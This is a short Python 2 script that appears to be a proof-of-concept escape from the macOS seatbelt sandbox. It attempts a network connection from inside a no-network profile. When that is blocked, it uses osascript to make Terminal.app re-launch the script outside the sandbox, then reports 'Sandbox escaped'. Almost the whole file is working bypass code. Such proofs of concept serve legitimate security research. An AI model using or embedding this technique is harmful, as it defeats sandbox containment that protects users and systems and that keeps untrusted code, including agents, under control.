import os
import sys
import socket

if len(sys.argv) != 2:
    print "[-] Usage: sandbox-exec -n no-network python %s hostname" % sys.argv[0]

try:
    targetIP = sys.argv[1]
    s = socket.socket()
    s.connect((targetIP, 80))
    s.send('GET /\r\n\r\n')
    print(s.recv(1024))
    print "\n\n\n[+] Sandbox escaped"

except Exception, e:
    if "Operation not permitted" in str(e): #print repr(e)
        print "[-] Blocked by seatbelt"
        print "[ ] Escaping..."
        os.system("""/usr/bin/osascript -e 'tell application "Terminal" to do script "python %s %s"'""" % (sys.argv[0], targetIP))


